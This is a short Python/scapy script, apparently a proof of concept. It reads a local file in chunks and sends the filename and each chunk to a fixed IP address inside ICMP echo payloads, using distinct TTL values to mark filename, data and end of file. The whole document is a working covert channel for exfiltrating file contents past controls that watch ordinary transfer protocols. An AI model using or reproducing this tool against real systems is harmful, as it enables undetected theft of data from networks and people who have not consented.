#!/usr/bin/python

from scapy.all import *
import sys

deadline = 1
chunksize = 1024

def read_file_bytes(filename, chunksize=chunksize):
	with open(filename, "rb") as file:
        	while True:
		        chunk = file.read(chunksize)
        		if chunk:
	                	yield chunk
        		else:
                		break


filename = "touch.txt"
target = "192.168.1.21"

ping_filename = IP(dst=target, ttl=120)/ICMP()/Raw(load=filename)
sr1(ping_filename, timeout=deadline)
for filedata in read_file_bytes(filename):
	ping_filedata = IP(dst=target, ttl=100)/ICMP()/Raw(load=filedata)
	sr1(ping_filedata, timeout=deadline)
ping_eof = IP(dst=target, ttl=60)/ICMP()
ping_eof.show2()
sr1(ping_eof, timeout=deadline)

